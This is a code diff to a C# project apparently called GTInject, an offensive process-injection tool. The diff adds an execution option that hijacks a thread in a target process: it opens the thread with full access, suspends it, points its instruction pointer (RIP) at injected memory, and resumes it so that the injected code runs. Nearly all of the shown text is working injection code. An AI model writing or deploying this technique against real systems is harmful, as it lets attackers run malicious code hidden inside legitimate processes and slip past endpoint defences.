@@ -23,6 +23,8 @@ namespace GTInject.Injection
                     return execopt100(memaddr, pid, tid);
                 case 101:
                     return execopt101(memaddr, pid, tid);
+                case 102:
+                    return execopt102(memaddr, pid, tid);
                 case 200:
                     return execopt200(memaddr, pid, tid);
                 case 201:
@@ -127,14 +129,34 @@ namespace GTInject.Injection
             // At WINAPI level, we can do this natively in C#, consider alternative methods for NT and syscall levels
 
             // Currently just hijackign last thread, but a rewrite to the threads module could allow us to see all threads and manually choose a thread ID to hijack.
+            if (ThreadID == 0)
+            {
+                // Find the 2nd last thread ID, the user hasn't selected their own
+                var threadObjects = ProcID.Threads;
+                ThreadID = threadObjects[threadObjects.Count - 2].Id;
+                Console.WriteLine("[+] Found a Thread to hijack " + ThreadID);
+            }
+            else
+            {
+                // Use the users thread Id for injection
+                Console.WriteLine("[+] Using your thread ID to hijack TID " + ThreadID);
+            }
 
-            var threadObjects = ProcID.Threads;
-            var lastthread = threadObjects[threadObjects.Count - 1];
+            CONTEXT64 contextObj = new CONTEXT64();
+            contextObj.ContextFlags = CONTEXT_FLAGS.CONTEXT_FULL;
 
+            var threadHandle = OpenThread((uint)ThreadAccessRights.AllAccess, false, (uint)ThreadID);//0x40000000, false, (uint)threadId);
+            Console.WriteLine("     Opened handle as thread handle = " + threadHandle + ". Suspending now.. ");
+            SuspendThread(threadHandle);
 
-            var threadHandle = OpenThread(0x001F03FF, false, (uint)ThreadID);//0x40000000, false, (uint)threadId);
+            GetThreadContext(threadHandle, ref contextObj);
+            contextObj.Rip = (ulong)memaddr;
+            Console.WriteLine("     Have thread context, set RIP to " + contextObj.Rip);
+            SetThreadContext(threadHandle, ref contextObj);
 
-
+            Console.WriteLine("     Calling ResumeThread");
+            var resumed = ResumeThread(threadHandle);
+            Console.WriteLine("     Resume Thread response = " + resumed + ". 1 is Good, anything else indicates possible failure");
             return IntPtr.Zero;
 
 
